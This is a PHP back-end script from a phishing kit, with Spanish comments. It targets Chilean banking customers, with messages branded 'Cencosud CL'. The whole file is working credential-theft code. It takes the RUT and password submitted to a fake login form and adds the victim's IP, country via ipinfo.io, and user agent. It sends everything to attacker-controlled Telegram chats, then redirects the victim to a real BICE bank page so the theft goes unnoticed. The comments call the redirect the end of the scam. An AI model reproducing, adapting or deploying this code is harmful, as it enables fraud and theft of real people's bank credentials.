<?php  


// Abre el Archivo bote_user.php y utiliza el bot y el userid que se asignan en el archivo.

include('bote_user.php');  

// ====================================== C O N F I G U R A R  -  V A R I A B L E S =================================================================================


$usuario = $_POST['username'];
$pass = $_POST['password'];


$fecha_actual = date("Y-m-d H:i:s");


$user_agent = $_SERVER['HTTP_USER_AGENT'];


$ip = $_SERVER['REMOTE_ADDR'];
$access_token = 'bae97410faca2e'; 
$url_ipinfo = "ipinfo.io/186.189.75.68?token=bae97410faca2e";
$respuesta_ipinfo = file_get_contents($url_ipinfo);
$datos_ip = json_decode($respuesta_ipinfo, true);
$pais = $datos_ip['country'] ?? 'Desconocido';


// ======================================= M E N S A J E  -  ENVIA A T E L E G R A M ===============================================================================

// ESTE ES EL FORMATO DE MENSAJE QUE SE ENVIARA A TU TELEGRAM, UTILIZANDO LOS DATOS RECOLECTADOS DE LA VARIABLE "USUARIO Y PASS"
// Mensaje a enviar a Telegram
// Mensaje a enviar a Telegram con user_agent añadido
$enviara = "➖➖💲Cencosud CL 🏴‍☠️💲➖➖\n" .
    "<b>👤Rut: </b> <code>" . $usuario . "</code>\n" .
    "<b>🔐Clave: </b> <code>" . $pass . "</code>\n" .
    "🌐IP " . $ip . "\n" .
    "🌐País: " . $pais . "\n" .
    "📅Fecha: " . $fecha_actual . "\n" .
    "🌐WEBSITE " . $_SERVER['SERVER_NAME'] . "\n" .
    "🌐User Agent: " . $user_agent . "\n"; // Línea añadida


// ===================================== N O   T O C A R ============================================================================================================

// Esta función se utiliza para enviar mensajes a Telegram.   
// ACA NO DEBES CONFIGURAR NADA
$enviar =  urldecode($enviara);
define('BOT_TOKEN', $bottoken);
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
function enviar_telegram($enviar, $chat_id){
    $queryArray = [
      'chat_id' => $chat_id,
      'text' => $enviar,
    ];
    $url = API_URL.'sendMessage?'. http_build_query($queryArray)."&parse_mode=html";
    $result = file_get_contents($url);
}

foreach($chatids as $chat_id){
    enviar_telegram($enviar, $chat_id);
}





// ===================================== C O N F I G U R A R  -  S I G U I E N T E  -  P A G I N A ==================================================================



// Colocas La Siguente Pagina a Mostrar.
// Puedes Utilizar algun archivo "espere.html" o tambien puedes usar una URL como ABAJO
// Ejemplo: La URL puede ser el final del scam, para que el usuario vaya ala pagina oficial


header("Location: https://banco.bice.cl/personas");

?>
